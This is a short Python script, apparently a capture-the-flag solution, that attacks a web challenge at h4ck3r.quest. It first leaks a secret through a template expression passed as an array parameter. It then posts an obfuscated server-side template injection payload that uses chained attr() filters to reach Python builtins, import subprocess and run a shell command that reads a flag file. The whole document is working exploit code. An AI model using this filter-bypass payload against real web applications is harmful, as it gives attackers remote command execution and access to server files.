import requests
import html

r = requests.get("http://h4ck3r.quest:10005/welcome", params={"name[]": "{{secret}}"})
secret = r.text.split("Hello ")[1].split("!")[0]
print(secret)  # 77777me0w_me0w_s3cr3t77777

payload2 = """
{{g|attr('pop')|attr('_'*2+'globals'+'_'*2)|attr('get')('_'*2+'builtins'+'_'*2)|attr('get')('_'*2+'import'+'_'*2)('subprocess')|attr('check_output')(('cat','/y000_i_am_za_fl4g'))}}
"""
r = requests.post(
    f"http://h4ck3r.quest:10005/2nd_stage_{secret}",
    data={"name": payload2},
)
print(html.unescape(r.text))
